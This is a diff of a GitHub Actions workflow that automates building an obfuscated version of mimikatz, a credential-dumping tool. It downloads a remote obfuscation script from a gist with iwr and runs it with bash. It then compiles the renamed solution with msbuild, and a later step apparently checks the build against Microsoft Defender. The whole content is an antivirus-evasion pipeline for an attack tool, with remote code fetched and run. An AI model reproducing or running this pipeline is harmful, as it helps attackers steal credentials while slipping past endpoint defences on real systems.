@@ -40,14 +40,18 @@ jobs:
         cd "$env:GITHUB_WORKSPACE\working"
         iwr -uri https://gist.githubusercontent.com/S3cur3Th1sSh1t/08623de0c5cc67d36d4a235cec0f5333/raw/dafbd32d1307c4ebb512e4eb7c43c7e1292bcac9/ObfuscateMimi_First.sh -outfile run.sh
         sed -i '$ d' run.sh
-        echo "echo \$mini" >> run.sh
-        
-    - name: Run obfuscation script and build
+  
+    - name: Run obfuscation script
       shell: bash
       run: |
         cd "$GITHUB_WORKSPACE\working"
-        MIMI=$(bash run.sh)
-        msbuild /t:Build  "${MIMI}.sln"
+        bash run.sh
+    
+    - name: Build mimikatz
+      run: |
+        cd "$env:GITHUB_WORKSPACE\working"
+        $MIMI = (gci -filter *.sln | select -exp Name)
+        msbuild /t:Build  "$MIMI.sln"
         
     - name: Check current with Defender
       run: |
